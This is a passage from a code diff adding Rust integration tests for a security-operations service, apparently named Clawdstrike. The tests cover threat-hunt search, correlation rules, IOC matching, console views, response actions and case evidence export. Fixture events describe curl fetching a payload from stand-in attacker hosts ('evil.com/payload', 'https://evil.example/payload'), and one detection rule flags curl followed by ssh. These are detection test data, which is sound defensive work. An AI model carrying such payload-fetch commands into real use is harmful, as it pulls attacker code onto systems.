+    .await;
+    assert_eq!(timeline_resp.0, StatusCode::OK);
+    assert_eq!(timeline_resp.1["groupedBy"], "session");
+    assert_eq!(timeline_resp.1["events"][0]["eventId"], "hunt-evt-1");
+    assert_eq!(timeline_resp.1["events"][1]["eventId"], "hunt-evt-2");
+
+    let create_saved_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/hunt/saved".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "name": "curl session hunt",
+            "description": "integration saved hunt",
+            "query": {
+                "sessionId": "session-1",
+                "limit": 10
+            }
+        })),
+    )
+    .await;
+    assert_eq!(create_saved_resp.0, StatusCode::OK);
+    let saved_id = create_saved_resp.1["id"].as_str().expect("saved hunt id");
+
+    let list_saved_resp = request_json(
+        &harness.app,
+        Method::GET,
+        "/api/v1/hunt/saved".to_string(),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(list_saved_resp.0, StatusCode::OK);
+    assert_eq!(list_saved_resp.1.as_array().expect("saved hunts").len(), 1);
+
+    let run_saved_resp = request_json(
+        &harness.app,
+        Method::POST,
+        format!("/api/v1/hunt/saved/{saved_id}/run"),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(run_saved_resp.0, StatusCode::OK);
+    assert_eq!(run_saved_resp.1["jobType"], "saved_hunt");
+    assert_eq!(run_saved_resp.1["status"], "completed");
+    assert_eq!(
+        run_saved_resp.1["result"]["events"]
+            .as_array()
+            .expect("saved run events")
+            .len(),
+        2
+    );
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn hunt_correlation_and_ioc_jobs_store_results() {
+    if !docker_available() {
+        eprintln!("Skipping integration test: docker is unavailable");
+        return;
+    }
+
+    let harness = setup_harness().await;
+    seed_hunt_events(&harness).await;
+
+    let correlate_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/hunt/correlate".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "rules": [{
+                "schema": "clawdstrike.hunt.correlation.v1",
+                "name": "curl_then_ssh",
+                "severity": "high",
+                "description": "curl followed by ssh",
+                "window": "10m",
+                "conditions": [
+                    {
+                        "bind": "curl",
+                        "source": "tetragon",
+                        "action_type": "process",
+                        "target_pattern": "curl"
+                    },
+                    {
+                        "bind": "ssh",
+                        "source": "tetragon",
+                        "action_type": "process",
+                        "target_pattern": "ssh",
+                        "after": "curl",
+                        "within": "5m"
+                    }
+                ],
+                "output": {
+                    "title": "curl followed by ssh",
+                    "evidence": ["curl", "ssh"]
+                }
+            }],
+            "query": {
+                "sessionId": "session-1",
+                "limit": 10
+            }
+        })),
+    )
+    .await;
+    assert_eq!(correlate_resp.0, StatusCode::OK);
+    assert_eq!(correlate_resp.1["jobType"], "correlate");
+    assert_eq!(
+        correlate_resp.1["result"]["findings"][0]["evidenceEventIds"][0],
+        "hunt-evt-1"
+    );
+    assert_eq!(
+        correlate_resp.1["result"]["findings"][0]["evidenceEventIds"][1],
+        "hunt-evt-2"
+    );
+
+    let ioc_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/hunt/ioc/match".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "indicators": ["evil.com"],
+            "query": {
+                "sessionId": "session-1",
+                "limit": 10
+            }
+        })),
+    )
+    .await;
+    assert_eq!(ioc_resp.0, StatusCode::OK);
+    assert_eq!(ioc_resp.1["jobType"], "ioc_match");
+    assert_eq!(ioc_resp.1["result"]["matches"][0]["eventId"], "hunt-evt-1");
+
+    let job_id = ioc_resp.1["id"].as_str().expect("job id");
+    let get_job_resp = request_json(
+        &harness.app,
+        Method::GET,
+        format!("/api/v1/hunt/jobs/{job_id}"),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(get_job_resp.0, StatusCode::OK);
+    assert_eq!(get_job_resp.1["status"], "completed");
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn console_read_model_routes_project_tenant_scoped_data() {
+    if !docker_available() {
+        eprintln!("Skipping integration test: docker is unavailable");
+        return;
+    }
+
+    let harness = setup_harness().await;
+    let fixture = seed_console_read_model_fixture(&harness).await;
+
+    let overview_resp = request_json(
+        &harness.app,
+        Method::GET,
+        "/api/v1/console/overview".to_string(),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(overview_resp.0, StatusCode::OK);
+    assert_eq!(overview_resp.1["counts"]["principals"], 2);
+    assert_eq!(overview_resp.1["counts"]["endpointAgents"], 1);
+    assert_eq!(overview_resp.1["counts"]["runtimeAgents"], 1);
+    assert_eq!(overview_resp.1["counts"]["swarms"], 1);
+    assert_eq!(overview_resp.1["counts"]["projects"], 1);
+    assert_eq!(overview_resp.1["counts"]["quarantinedPrincipals"], 1);
+    assert_eq!(overview_resp.1["counts"]["stalePrincipals"], 1);
+    assert_eq!(overview_resp.1["counts"]["activeResponseActions"], 1);
+    assert_eq!(overview_resp.1["counts"]["openDetections"], 1);
+    assert_eq!(
+        overview_resp.1["recentResponseActions"][0]["actionId"],
+        fixture.action_id.to_string()
+    );
+    assert_eq!(
+        overview_resp.1["recentDetections"][0]["principalId"],
+        fixture.principal_id.to_string()
+    );
+
+    let principals_resp = request_json(
+        &harness.app,
+        Method::GET,
+        "/api/v1/console/principals".to_string(),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(principals_resp.0, StatusCode::OK);
+    let principals = principals_resp.1.as_array().expect("principals list");
+    assert_eq!(principals.len(), 2);
+    let principal = principals
+        .iter()
+        .find(|item| item["principalId"] == fixture.principal_id.to_string())
+        .expect("primary principal in list");
+    assert_eq!(principal["endpointPosture"], "nominal");
+    assert_eq!(principal["openResponseActionCount"], 1);
+    assert_eq!(principal["swarmNames"], serde_json::json!(["Fleet East"]));
+    assert_eq!(
+        principal["projectNames"],
+        serde_json::json!(["Payments Prod"])
+    );
+    assert_eq!(
+        principal["capabilityGroupNames"],
+        serde_json::json!(["Responders"])
+    );
+
+    let detail_resp = request_json(
+        &harness.app,
+        Method::GET,
+        format!("/api/v1/console/principals/{}", fixture.principal_id),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(detail_resp.0, StatusCode::OK);
+    assert_eq!(
+        detail_resp.1["memberships"]
+            .as_array()
+            .expect("memberships")
+            .len(),
+        3
+    );
+    assert_eq!(detail_resp.1["effectivePolicy"]["resolutionVersion"], 4);
+    let compiled_policy = detail_resp.1["compiledPolicyYaml"]
+        .as_str()
+        .expect("compiled policy yaml");
+    assert!(compiled_policy.contains("mode: swarm"));
+    assert!(compiled_policy.contains("region: east"));
+    assert!(compiled_policy.contains("final: true"));
+    assert_eq!(
+        detail_resp.1["sourceAttachments"]
+            .as_array()
+            .expect("source attachments")
+            .len(),
+        3
+    );
+    assert_eq!(
+        detail_resp.1["activeGrants"][0]["grantId"],
+        fixture.grant_id.to_string()
+    );
+    assert_eq!(detail_resp.1["recentSessions"][0]["sessionId"], "session-1");
+
+    let timeline_resp = request_json(
+        &harness.app,
+        Method::GET,
+        format!(
+            "/api/v1/console/timeline?principal_id={}",
+            fixture.principal_id
+        ),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(timeline_resp.0, StatusCode::OK);
+    let timeline = timeline_resp.1.as_array().expect("timeline list");
+    assert_eq!(timeline.len(), 2);
+    assert_eq!(timeline[0]["eventId"], "console-hunt-2");
+    assert_eq!(timeline[1]["eventId"], "console-hunt-1");
+
+    let principal_timeline_resp = request_json(
+        &harness.app,
+        Method::GET,
+        format!(
+            "/api/v1/console/principals/{}/timeline",
+            fixture.principal_id
+        ),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(principal_timeline_resp.0, StatusCode::OK);
+    assert_eq!(
+        principal_timeline_resp
+            .1
+            .as_array()
+            .expect("principal timeline")
+            .len(),
+        2
+    );
+
+    let actions_resp = request_json(
+        &harness.app,
+        Method::GET,
+        "/api/v1/console/response-actions".to_string(),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(actions_resp.0, StatusCode::OK);
+    let actions = actions_resp.1.as_array().expect("response actions list");
+    assert_eq!(actions.len(), 1);
+    assert_eq!(actions[0]["targetDisplayName"], "Planner MacBook");
+
+    let graph_resp = request_json(
+        &harness.app,
+        Method::GET,
+        format!("/api/v1/console/principals/{}/graph", fixture.principal_id),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(graph_resp.0, StatusCode::OK);
+    assert_eq!(
+        graph_resp.1["rootPrincipalId"],
+        fixture.principal_id.to_string()
+    );
+    assert!(graph_resp.1["nodes"]
+        .as_array()
+        .expect("graph nodes")
+        .iter()
+        .any(|node| node["id"] == fixture.grant_id.to_string()));
+    assert!(graph_resp.1["edges"]
+        .as_array()
+        .expect("graph edges")
+        .iter()
+        .any(|edge| edge["kind"] == "received_grant"));
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn fleet_operator_workflow_links_detection_response_case_hunt_graph_and_console() {
+    if !docker_available() {
+        eprintln!("Skipping integration test: docker is unavailable");
+        return;
+    }
+
+    let harness = setup_harness().await;
+    let OperatorFlowFixture {
+        agent_id,
+        session_id,
+        detection_raw_ref,
+        response_raw_ref,
+        principal_id,
+        response_subject,
+        grant_id,
+        finding_id,
+        case_id,
+        action_id,
+    } = seed_operator_flow_fixture(&harness).await;
+    let mut subscriber = harness
+        .nats
+        .subscribe(response_subject.clone())
+        .await
+        .expect("subscribe response subject");
+    harness.nats.flush().await.expect("nats flush");
+
+    let finding_resp = request_json(
+        &harness.app,
+        Method::GET,
+        format!("/api/v1/detections/findings/{finding_id}"),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(finding_resp.0, StatusCode::OK);
+    assert_eq!(finding_resp.1["principal_id"], principal_id.to_string());
+    assert_eq!(finding_resp.1["grant_id"], grant_id.to_string());
+    assert_eq!(
+        finding_resp.1["response_action_ids"],
+        serde_json::json!([action_id.to_string()])
+    );
+    assert_eq!(
+        finding_resp.1["evidence_refs"],
+        serde_json::json!([detection_raw_ref])
+    );
+
+    let finding_list_resp = request_json(
+        &harness.app,
+        Method::GET,
+        format!("/api/v1/detections/findings?principal_id={principal_id}"),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(finding_list_resp.0, StatusCode::OK);
+    assert_eq!(
+        finding_list_resp.1.as_array().expect("findings list").len(),
+        1
+    );
+
+    let approve_resp = request_json(
+        &harness.app,
+        Method::POST,
+        format!("/api/v1/response-actions/{action_id}/approve"),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(approve_resp.0, StatusCode::OK);
+    assert_eq!(approve_resp.1["action"]["status"], "published");
+    assert_eq!(approve_resp.1["deliveries"][0]["status"], "published");
+    assert_eq!(
+        approve_resp.1["deliveries"][0]["delivery_subject"],
+        response_subject
+    );
+
+    let published_message = tokio::time::timeout(Duration::from_secs(5), subscriber.next())
+        .await
+        .expect("response action publish timeout")
+        .expect("subscriber stream ended");
+    let envelope: Value = serde_json::from_slice(&published_message.payload)
+        .expect("response payload should be JSON");
+    assert!(
+        spine::verify_envelope(&envelope).expect("response action envelope should verify"),
+        "response action payload must be a signed spine envelope"
+    );
+    assert_eq!(envelope["fact"]["actionId"], action_id.to_string());
+    assert_eq!(
+        envelope["fact"]["sourceDetectionId"],
+        finding_id.to_string()
+    );
+    assert_eq!(envelope["fact"]["caseId"], case_id);
+
+    let overview_resp = request_json(
+        &harness.app,
+        Method::GET,
+        "/api/v1/console/overview".to_string(),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(overview_resp.0, StatusCode::OK);
+    assert_eq!(overview_resp.1["counts"]["principals"], 1);
+    assert_eq!(overview_resp.1["counts"]["endpointAgents"], 1);
+    assert_eq!(overview_resp.1["counts"]["activeResponseActions"], 1);
+    assert_eq!(overview_resp.1["counts"]["openDetections"], 1);
+    assert_eq!(
+        overview_resp.1["recentDetections"][0]["detectionId"],
+        finding_id.to_string()
+    );
+    assert_eq!(
+        overview_resp.1["recentResponseActions"][0]["actionId"],
+        action_id.to_string()
+    );
+
+    let detection_event_id = "operator-flow-hunt-1";
+    let detection_event_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/hunt/events/ingest".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "event": {
+                "eventId": detection_event_id,
+                "tenantId": harness.tenant_id.to_string(),
+                "source": "tetragon",
+                "kind": "process_exec",
+                "occurredAt": "2026-03-06T13:00:00Z",
+                "ingestedAt": "2026-03-06T13:00:01Z",
+                "severity": "high",
+                "verdict": "allow",
+                "summary": "curl execution on Operator Endpoint triggered detection",
+                "actionType": "process",
+                "principal": {
+                    "principalId": principal_id.to_string(),
+                    "endpointAgentId": agent_id,
+                    "principalType": "endpoint_agent"
+                },
+                "sessionId": session_id,
+                "grantId": grant_id.to_string(),
+                "detectionIds": [finding_id.to_string()],
+                "target": {
+                    "kind": "process",
+                    "id": "2001",
+                    "name": "curl"
+                },
+                "evidence": {
+                    "rawRef": detection_raw_ref,
+                    "envelopeHash": "hash-operator-flow-detection-1",
+                    "issuer": "spiffe://tenant/acme-int",
+                    "schemaName": "clawdstrike.sdr.fact.tetragon_event.v1",
+                    "signatureValid": true
+                },
+                "attributes": {
+                    "process": "/usr/bin/curl",
+                    "pod": "operator-endpoint",
+                    "url": "https://evil.example/payload"
+                }
+            },
+            "rawEnvelope": {
+                "fact": {
+                    "schema": "clawdstrike.sdr.fact.tetragon_event.v1"
+                }
+            }
+        })),
+    )
+    .await;
+    assert_eq!(detection_event_resp.0, StatusCode::OK);
+
+    let ack_resp = request_json(
+        &harness.app,
+        Method::POST,
+        format!("/api/v1/response-actions/{action_id}/acks"),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "targetKind": "endpoint",
+            "targetId": agent_id,
+            "status": "acknowledged",
+            "message": "policy reload completed",
+            "resultingState": "reloaded"
+        })),
+    )
+    .await;
+    assert_eq!(ack_resp.0, StatusCode::OK);
+    assert_eq!(ack_resp.1["action"]["status"], "acknowledged");
+    assert_eq!(ack_resp.1["deliveries"][0]["status"], "acknowledged");
+    assert_eq!(ack_resp.1["acknowledgements"][0]["status"], "acknowledged");
+
+    let response_event_id = "operator-flow-hunt-2";
+    let response_event_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/hunt/events/ingest".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "event": {
+                "eventId": response_event_id,
+                "tenantId": harness.tenant_id.to_string(),
+                "source": "response",
+                "kind": "response_action_updated",
+                "occurredAt": "2026-03-06T13:05:00Z",
+                "ingestedAt": "2026-03-06T13:05:01Z",
+                "severity": "medium",
+                "verdict": "deny",
+                "summary": "response action acknowledged for Operator Endpoint",
+                "actionType": "request_policy_reload",
+                "principal": {
+                    "principalId": principal_id.to_string(),
+                    "endpointAgentId": agent_id,
+                    "principalType": "endpoint_agent"
+                },
+                "sessionId": session_id,
+                "grantId": grant_id.to_string(),
+                "responseActionId": action_id.to_string(),
+                "detectionIds": [finding_id.to_string()],
+                "target": {
+                    "kind": "endpoint",
+                    "id": agent_id,
+                    "name": "Operator Endpoint"
+                },
+                "evidence": {
+                    "rawRef": response_raw_ref,
+                    "envelopeHash": "hash-operator-flow-response-1",
+                    "issuer": "spiffe://tenant/acme-int",
+                    "schemaName": "clawdstrike.sdr.fact.response_action.v1",
+                    "signatureValid": true
+                },
+                "attributes": {
+                    "status": "acknowledged",
+                    "message": "policy reload completed"
+                }
+            },
+            "rawEnvelope": {
+                "fact": {
+                    "schema": "clawdstrike.sdr.fact.response_action.v1"
+                }
+            }
+        })),
+    )
+    .await;
+    assert_eq!(response_event_resp.0, StatusCode::OK);
+
+    let update_case_resp = request_json(
+        &harness.app,
+        Method::PATCH,
+        format!("/api/v1/cases/{case_id}"),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "status": "in_progress",
+            "responseActionIds": [action_id.to_string()],
+            "grantIds": [grant_id.to_string()]
+        })),
+    )
+    .await;
+    assert_eq!(update_case_resp.0, StatusCode::OK);
+    assert_eq!(update_case_resp.1["status"], "in_progress");
+    assert_eq!(
+        update_case_resp.1["responseActionIds"],
+        serde_json::json!([action_id.to_string()])
+    );
+    assert_eq!(
+        update_case_resp.1["grantIds"],
+        serde_json::json!([grant_id.to_string()])
+    );
+
+    let exercise_resp = request_json(
+        &harness.app,
+        Method::POST,
+        format!("/api/v1/grants/{grant_id}/exercise"),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "session_id": session_id,
+            "session_label": "Operator workflow session",
+            "session_state": "observed",
+            "response_action_id": action_id.to_string(),
+            "response_action_label": "Policy reload request",
+            "response_action_state": "acknowledged",
+            "response_action_metadata": {
+                "caseId": case_id,
+                "sourceDetectionId": finding_id.to_string()
+            }
+        })),
+    )
+    .await;
+    assert_eq!(exercise_resp.0, StatusCode::OK);
+    assert!(exercise_resp.1["edges"]
+        .as_array()
+        .expect("grant exercise edges")
+        .iter()
+        .any(|edge| edge["kind"] == "triggered_response_action"));
+
+    let search_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/hunt/search".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "principalId": principal_id.to_string(),
+            "limit": 10
+        })),
+    )
+    .await;
+    assert_eq!(search_resp.0, StatusCode::OK);
+    assert_eq!(search_resp.1["total"], 2);
+    assert_eq!(search_resp.1["events"][0]["eventId"], response_event_id);
+    assert_eq!(search_resp.1["events"][1]["eventId"], detection_event_id);
+    assert_eq!(
+        search_resp.1["events"][0]["responseActionId"],
+        action_id.to_string()
+    );
+    assert_eq!(
+        search_resp.1["events"][0]["detectionIds"],
+        serde_json::json!([finding_id.to_string()])
+    );
+
+    let timeline_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/hunt/timeline".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "sessionId": session_id,
+            "limit": 10
+        })),
+    )
+    .await;
+    assert_eq!(timeline_resp.0, StatusCode::OK);
+    assert_eq!(timeline_resp.1["groupedBy"], "session");
+    assert_eq!(timeline_resp.1["events"][0]["eventId"], detection_event_id);
+    assert_eq!(timeline_resp.1["events"][1]["eventId"], response_event_id);
+
+    let raw_graph_resp = request_json(
+        &harness.app,
+        Method::GET,
+        format!("/api/v1/principals/{principal_id}/delegation-graph"),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(raw_graph_resp.0, StatusCode::OK);
+    assert_eq!(
+        raw_graph_resp.1["root_node_id"],
+        format!("principal:{principal_id}")
+    );
+    assert!(raw_graph_resp.1["nodes"]
+        .as_array()
+        .expect("raw graph nodes")
+        .iter()
+        .any(|node| node["id"] == format!("grant:{grant_id}")));
+    assert!(raw_graph_resp.1["nodes"]
+        .as_array()
+        .expect("raw graph nodes")
+        .iter()
+        .any(|node| node["id"] == format!("response_action:{action_id}")));
+    assert!(raw_graph_resp.1["edges"]
+        .as_array()
+        .expect("raw graph edges")
+        .iter()
+        .any(|edge| edge["kind"] == "issued_grant"));
+    assert!(raw_graph_resp.1["edges"]
+        .as_array()
+        .expect("raw graph edges")
+        .iter()
+        .any(|edge| edge["kind"] == "triggered_response_action"));
+
+    let path_resp = request_json(
+        &harness.app,
+        Method::GET,
+        format!("/api/v1/graph/paths?from=principal:{principal_id}&to=response_action:{action_id}"),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(path_resp.0, StatusCode::OK);
+    assert_eq!(
+        path_resp.1["root_node_id"],
+        format!("principal:{principal_id}")
+    );
+    assert!(path_resp.1["edges"]
+        .as_array()
+        .expect("path edges")
+        .iter()
+        .any(|edge| edge["kind"] == "triggered_response_action"));
+
+    for artifact_request in [
+        serde_json::json!({
+            "artifactKind": "detection",
+            "artifactId": finding_id.to_string(),
+            "summary": "Detection finding",
+            "metadata": {
+                "principalId": principal_id.to_string(),
+                "detectionId": finding_id.to_string(),
+                "responseActionId": action_id.to_string(),
+                "ocsf": finding_resp.1["ocsf"].clone(),
+                "evidenceRefs": finding_resp.1["evidence_refs"].clone()
+            }
+        }),
+        serde_json::json!({
+            "artifactKind": "response_action",
+            "artifactId": action_id.to_string(),
+            "summary": "Response action acknowledgement",
+            "metadata": {
+                "principalId": principal_id.to_string(),
+                "detectionId": finding_id.to_string(),
+                "responseActionId": action_id.to_string(),
+                "status": "acknowledged",
+                "caseId": case_id,
+                "sourceDetectionId": finding_id.to_string()
+            }
+        }),
+        serde_json::json!({
+            "artifactKind": "graph_snapshot",
+            "artifactId": format!("principal:{principal_id}->response_action:{action_id}"),
+            "summary": "Principal to response-action graph path",
+            "metadata": {
+                "principalId": principal_id.to_string(),
+                "detectionId": finding_id.to_string(),
+                "responseActionId": action_id.to_string(),
+                "graph": path_resp.1.clone()
+            }
+        }),
+        serde_json::json!({
+            "artifactKind": "fleet_event",
+            "artifactId": detection_event_id,
+            "summary": "Detection hunt event",
+            "metadata": {
+                "principalId": principal_id.to_string(),
+                "detectionId": finding_id.to_string(),
+                "responseActionId": action_id.to_string(),
+                "eventId": detection_event_id,
+                "rawRef": detection_raw_ref,
+                "detectionIds": [finding_id.to_string()]
+            }
+        }),
+        serde_json::json!({
+            "artifactKind": "raw_envelope",
+            "artifactId": detection_raw_ref,
+            "summary": "Detection raw envelope",
+            "metadata": {
+                "principalId": principal_id.to_string(),
+                "detectionId": finding_id.to_string(),
+                "responseActionId": action_id.to_string(),
+                "rawRef": detection_raw_ref,
+                "schema": "clawdstrike.sdr.fact.tetragon_event.v1"
+            }
+        }),
+    ] {
+        let artifact_resp = request_json(
+            &harness.app,
+            Method::POST,
+            format!("/api/v1/cases/{case_id}/artifacts"),
+            Some(&harness.api_key),
+            Some(artifact_request),
+        )
+        .await;
+        assert_eq!(artifact_resp.0, StatusCode::OK);
+    }
+
+    let export_resp = request_json(
+        &harness.app,
+        Method::POST,
+        format!("/api/v1/cases/{case_id}/evidence/export"),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "principalIds": [principal_id.to_string()],
+            "detectionIds": [finding_id.to_string()],
+            "responseActionIds": [action_id.to_string()],
+            "includeRawEnvelopes": true,
+            "includeOcsf": true,
+            "retentionDays": 7
+        })),
+    )
+    .await;
+    assert_eq!(export_resp.0, StatusCode::OK);
+    assert_eq!(export_resp.1["status"], "completed");
+    assert_eq!(export_resp.1["artifactCounts"]["detection"], 1);
+    assert_eq!(export_resp.1["artifactCounts"]["response_action"], 1);
+    assert_eq!(export_resp.1["artifactCounts"]["graph_snapshot"], 1);
+    assert_eq!(export_resp.1["artifactCounts"]["fleet_event"], 1);
+    assert_eq!(export_resp.1["artifactCounts"]["raw_envelope"], 1);
+    let export_id = export_resp.1["exportId"].as_str().expect("export id");
+    let export_path = export_resp.1["filePath"]
+        .as_str()
+        .expect("bundle file path");
+    assert!(std::path::Path::new(export_path).exists());
+
+    let bundle_resp = request_json(
+        &harness.app,
+        Method::GET,
+        format!("/api/v1/evidence-bundles/{export_id}"),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(bundle_resp.0, StatusCode::OK);
+    assert_eq!(bundle_resp.1["status"], "completed");
+
+    let case_detail_resp = request_json(
+        &harness.app,
+        Method::GET,
+        format!("/api/v1/cases/{case_id}"),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(case_detail_resp.0, StatusCode::OK);
+    assert_eq!(
+        case_detail_resp.1["case"]["responseActionIds"],
+        serde_json::json!([action_id.to_string()])
+    );
+    assert_eq!(
+        case_detail_resp.1["case"]["grantIds"],
+        serde_json::json!([grant_id.to_string()])
+    );
+    assert_eq!(
+        case_detail_resp.1["artifacts"]
+            .as_array()
+            .expect("case artifacts")
+            .len(),
+        6
+    );
+    assert_eq!(
+        case_detail_resp.1["evidenceBundles"]
+            .as_array()
+            .expect("case bundles")
+            .len(),
+        1
+    );
+
+    let case_timeline_resp = request_json(
+        &harness.app,
+        Method::GET,
+        format!("/api/v1/cases/{case_id}/timeline"),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(case_timeline_resp.0, StatusCode::OK);
+    let case_timeline = case_timeline_resp.1.as_array().expect("case timeline");
+    let event_kinds = case_timeline
+        .iter()
+        .filter_map(|event| event["eventKind"].as_str())
+        .collect::<Vec<_>>();
+    assert!(event_kinds.contains(&"case_created"));
+    assert!(event_kinds.contains(&"status_changed"));
+    assert!(event_kinds.contains(&"case_updated"));
+    assert!(event_kinds.contains(&"bundle_requested"));
+    assert!(event_kinds.contains(&"bundle_completed"));
+    assert_eq!(
+        event_kinds
+            .iter()
+            .filter(|kind| **kind == "artifact_added")
+            .count(),
+        5
+    );
+
+    let principals_resp = request_json(
+        &harness.app,
+        Method::GET,
+        "/api/v1/console/principals".to_string(),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(principals_resp.0, StatusCode::OK);
+    let principals = principals_resp.1.as_array().expect("console principals");
+    assert_eq!(principals.len(), 1);
+    assert_eq!(principals[0]["principalId"], principal_id.to_string());
+    assert_eq!(principals[0]["displayName"], "Operator Endpoint");
+
+    let principal_detail_resp = request_json(
+        &harness.app,
+        Method::GET,
+        format!("/api/v1/console/principals/{principal_id}"),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(principal_detail_resp.0, StatusCode::OK);
+    assert_eq!(
+        principal_detail_resp.1["principal"]["principalId"],
+        principal_id.to_string()
+    );
+    assert_eq!(
+        principal_detail_resp.1["activeGrants"][0]["grantId"],
+        grant_id.to_string()
+    );
+    assert_eq!(
+        principal_detail_resp.1["recentSessions"][0]["sessionId"],
+        session_id
+    );
+
+    let console_actions_resp = request_json(
+        &harness.app,
+        Method::GET,
+        "/api/v1/console/response-actions".to_string(),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(console_actions_resp.0, StatusCode::OK);
+    let console_actions = console_actions_resp
+        .1
+        .as_array()
+        .expect("console response actions");
+    assert_eq!(console_actions.len(), 1);
+    assert_eq!(console_actions[0]["status"], "acknowledged");
+    assert_eq!(console_actions[0]["targetDisplayName"], "Operator Endpoint");
+    assert_eq!(
+        console_actions[0]["sourceDetectionId"],
+        finding_id.to_string()
+    );
+
+    let console_timeline_resp = request_json(
+        &harness.app,
+        Method::GET,
+        format!("/api/v1/console/timeline?principal_id={principal_id}"),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(console_timeline_resp.0, StatusCode::OK);
+    let console_timeline = console_timeline_resp
+        .1
+        .as_array()
+        .expect("console timeline");
+    assert_eq!(console_timeline.len(), 2);
+    assert_eq!(console_timeline[0]["eventId"], response_event_id);
+    assert_eq!(
+        console_timeline[0]["metadata"]["responseActionId"],
+        action_id.to_string()
+    );
+    assert_eq!(
+        console_timeline[0]["metadata"]["detectionIds"],
+        serde_json::json!([finding_id.to_string()])
+    );
+
+    let console_graph_resp = request_json(
+        &harness.app,
+        Method::GET,
+        format!("/api/v1/console/principals/{principal_id}/graph"),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(console_graph_resp.0, StatusCode::OK);
+    assert_eq!(
+        console_graph_resp.1["rootPrincipalId"],
+        principal_id.to_string()
+    );
+    assert!(console_graph_resp.1["nodes"]
+        .as_array()
+        .expect("console graph nodes")
+        .iter()
+        .any(|node| node["id"] == grant_id.to_string()));
+    assert!(console_graph_resp.1["nodes"]
+        .as_array()
+        .expect("console graph nodes")
+        .iter()
+        .any(|node| node["id"] == action_id.to_string()));
+    assert!(console_graph_resp.1["edges"]
+        .as_array()
+        .expect("console graph edges")
+        .iter()
+        .any(|edge| edge["kind"] == "triggered_response_action"));
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn authorization_bearer_header_accepts_api_keys() {
+    if !docker_available() {
+        eprintln!("Skipping integration test: docker is unavailable");
+        return;
+    }
+
+    let harness = setup_harness().await;
+
+    let response = request_json_bearer(
+        &harness.app,
+        Method::GET,
+        "/api/v1/console/overview".to_string(),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(response.0, StatusCode::OK);
 }
 
 async fn setup_harness() -> Harness {
@@ -539,6 +2545,22 @@ async fn setup_harness() -> Harness {
     }
 }
 
+async fn seed_tenant(db: &PgPool, slug: &str, name: &str) -> Uuid {
+    let tenant_id = Uuid::new_v4();
+    sqlx::query::query(
+        r#"INSERT INTO tenants (
+               id, name, slug, plan, status, agent_limit, retention_days
+           ) VALUES ($1, $2, $3, 'enterprise', 'active', 100, 30)"#,
+    )
+    .bind(tenant_id)
+    .bind(name)
+    .bind(slug)
+    .execute(db)
+    .await
+    .expect("seed tenant");
+    tenant_id
+}
+
 async fn apply_migrations(db: &PgPool) {
     let mut files =
         std::fs::read_dir(std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("migrations"))
@@ -553,6 +2575,994 @@ async fn apply_migrations(db: &PgPool) {
             .execute(db)
             .await
             .unwrap_or_else(|err| panic!("migration {:?} failed: {}", file, err));
+    }
+}
+
+async fn seed_hunt_events(harness: &Harness) {
+    for event in [
+        serde_json::json!({
+            "event": {
+                "eventId": "hunt-evt-1",
+                "tenantId": harness.tenant_id.to_string(),
+                "source": "tetragon",
+                "kind": "process_exec",
+                "occurredAt": "2026-03-06T12:00:00Z",
+                "ingestedAt": "2026-03-06T12:00:01Z",
+                "severity": "low",
+                "verdict": "allow",
+                "summary": "process_exec /usr/bin/curl evil.com/payload",
+                "actionType": "process",
+                "principal": {
+                    "principalId": "principal-1",
